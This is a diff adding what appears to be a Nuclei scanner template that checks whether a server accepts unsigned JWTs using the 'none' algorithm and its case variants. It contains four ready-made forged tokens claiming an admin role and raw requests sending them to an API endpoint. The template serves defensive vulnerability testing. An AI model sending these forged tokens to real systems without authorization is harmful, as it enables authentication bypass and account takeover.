@@ -1,0 +1,87 @@
+id: jwt-none-algorithm
+
+info:
+  name: JWT None Algorithm Acceptance
+  author: chipo
+  severity: critical
+  description: |
+    Tests whether the target accepts JWTs signed with the "none" algorithm, which
+    disables signature verification entirely. Crafts a token with alg set to "none",
+    "None", "NONE", and "nOnE" in the header (common case-normalization bypasses),
+    with the signature segment removed or set to an empty string. A successful
+    authentication response confirms the server does not enforce signature validation.
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9235
+    - https://cwe.mitre.org/data/definitions/347.html
+    - https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
+  metadata:
+    false-positive: |
+      Extremely low. A 200 authenticated response to a none-algorithm JWT is
+      definitionally a vulnerability. Confirm by checking that the response
+      contains user-specific data and not just a public landing page.
+    max-request: 4
+  tags: jwt,auth,crypto,cve-2015-9235,owasp-a02
+
+variables:
+  # Pre-built none-alg tokens with payload {"sub":"1337","role":"admin","iat":1700000000}
+  # Header: {"alg":"none","typ":"JWT"} -> eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
+  # Header: {"alg":"None","typ":"JWT"} -> eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0
+  # Payload: {"sub":"1337","role":"admin","iat":1700000000} -> eyJzdWIiOiIxMzM3Iiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ
+  jwt_none_lower: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMzM3Iiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ."
+  jwt_none_cap: "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMzM3Iiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ."
+  jwt_none_upper: "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMzM3Iiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ."
+  jwt_none_mixed: "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMzM3Iiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ."
+
+http:
+  - raw:
+      - |
+        GET /api/v1/me HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{jwt_none_lower}}
+        Accept: application/json
+        Connection: close
+
+      - |
+        GET /api/v1/me HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{jwt_none_cap}}
+        Accept: application/json
+        Connection: close
+
+      - |
+        GET /api/v1/me HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{jwt_none_upper}}
+        Accept: application/json
+        Connection: close
+
+      - |
+        GET /api/v1/me HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{jwt_none_mixed}}
+        Accept: application/json
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - '"sub"'
+          - '"id"'
+          - '"user"'
+          - '"email"'
+          - '"role"'
+        condition: or
+
+      - type: dsl
+        dsl:
+          - "!contains(body, \"invalid\")"
+          - "!contains(body, \"signature\")"
+          - "!contains(body, \"unauthorized\")"
+          - "!contains(body, \"401\")"
+        condition: and
